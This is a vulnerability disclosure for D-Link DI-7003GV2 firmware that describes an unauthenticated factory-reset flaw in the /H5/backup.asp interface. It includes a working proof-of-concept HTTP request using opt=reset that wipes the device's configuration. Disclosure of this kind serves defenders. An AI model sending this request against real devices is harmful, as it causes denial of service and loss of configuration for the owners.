# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) contains an authentication bypass vulnerability in the `/H5/backup.asp` interface. Remote attackers can trigger a factory reset of the device by sending a crafted HTTP request with `opt=reset` without authentication. Exploitation results in the immediate loss of device configuration and service interruption, potentially leading to denial of service or unauthorized control reset.

# Vulnerability details

The `H5/backup.asp` interface is processed by the `sub_4983B0` function.

![图 0](img/feae5ba6aabe6361f03ef1b06630f13c5e6139b4c93097c35d8f4995e64a3e00.png)  

`sub_4983B0` function: The opt parameter has three options: backup, recover, and reset, where reset can reset the system configuration to the factory settings state.

![图 1](img/c1d09e5dd61a24ef0b7bee7cb5650c894aa74b8df4664002a8fcb6679138b296.png)  


# POC

After sending the request, no response information from the device is received, but in fact, the device has already entered the factory reset process.

```http
GET /H5/backup.asp?opt=reset HTTP/1.1
Host: 192.168.0.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

![图 2](img/3a2fa9b82ecfbcc94725e1e8f7d00bbd0913bd575c495ce280e5684cdd8ceebc.png)  

The device cannot be accessed.

![图 3](img/bd2510d7297d7ae3156cc749535870e6eebb03d2778f86f88e02835cbf0c40e6.png)  

After waiting for the factory settings restoration to complete, the device's IP address will revert to the default 192.168.0.1, and accessing this address will display the initial setup process of the device.

![图 4](img/cbba78848aa4d1d25a50ca872fb65952a4f4551783dbb44dab6aa1831cf9988e.png)  
